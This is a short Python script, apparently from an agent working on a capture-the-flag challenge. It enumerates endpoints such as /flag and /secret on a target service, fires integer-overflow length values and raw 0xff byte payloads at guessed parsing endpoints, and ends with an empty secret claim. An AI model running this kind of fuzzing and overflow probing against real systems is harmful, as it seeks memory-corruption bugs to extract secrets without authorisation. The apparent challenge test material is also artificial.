import json,sys,base64

def req(method,path,body=None,body_hex=None,headers=None):
    m={"http":{"method":method,"path":path}}
    if body is not None: m["http"]["body"]=body
    if body_hex is not None: m["http"]["body_hex"]=body_hex
    if headers: m["http"]["headers"]=headers
    print(json.dumps(m),flush=True)
    line=sys.stdin.readline()
    if not line: return None
    return json.loads(line)

def show(tag,r):
    if r is None:
        print("None",tag); return
    b=r.get("body_b64")
    try: t=base64.b64decode(b).decode('utf-8','replace')
    except Exception: t=str(b)
    print("===",tag,r.get("status"),r.get("content_type"),"===")
    print(t[:3000],flush=True)

# discovery
for p in ["/","/help","/index.html","/robots.txt"]:
    show(p,req("GET",p))
for p in ["/","/help"]:
    show("POST "+p,req("POST",p,body=""))

# common record-parsing endpoints
paths=["/parse","/record","/records","/records/parse","/parse/record","/api/parse","/api/record",
 "/upload","/decode","/read","/ingest","/parse-record","/rpc","/query","/search",
        "/flag","/secret","/health","/status","/version"]
for p in paths:
    r=req("GET",p)
    show("GET "+p,r)
for p in paths:
    r=req("POST",p,body="test")
    if r and r.get("status") not in (404,405):
        show("POST "+p,r)

# overflow attempts with JSON length fields
payloads=[
 '{"length":-1}',
 '{"length":4294967295}',
 '{"length":999999999}',
 '{"len":-1}',
 '{"size":-1}',
 '{"count":-1}',
 '{"n":-1}',
 '{"length":18446744073709551615}',
 '{"length":2147483647}',
 '{"length":-2147483648}',
 '{"length":99999999999999999999}',
]
for pl in payloads:
    for p in ["/parse","/","/record","/upload","/decode","/ingest","/api/parse"]:
        r=req("POST",p,body=pl,headers={"Content-Type":"application/json"})
        if r and r.get("status") not in (404,405):
            show("POSTjson "+p+" "+pl,r)

# raw overflow bytes
raws=[b"\xff\xff\xff\xff", b"\xff"*8, b"\x00\xff\xff\xff\x7f",
      b"A"+b"\xff\xff\xff\xff", b"\xff\xff\xff\xffA"]
for rb in raws:
    for p in ["/parse","/","/record","/upload","/decode","/ingest"]:
        r=req("POST",p,body_hex=rb.hex())
        if r and r.get("status") not in (404,405):
            show("POSTraw "+p+" "+rb.hex(),r)

print('CLAIM:{"secret_hex": ""}')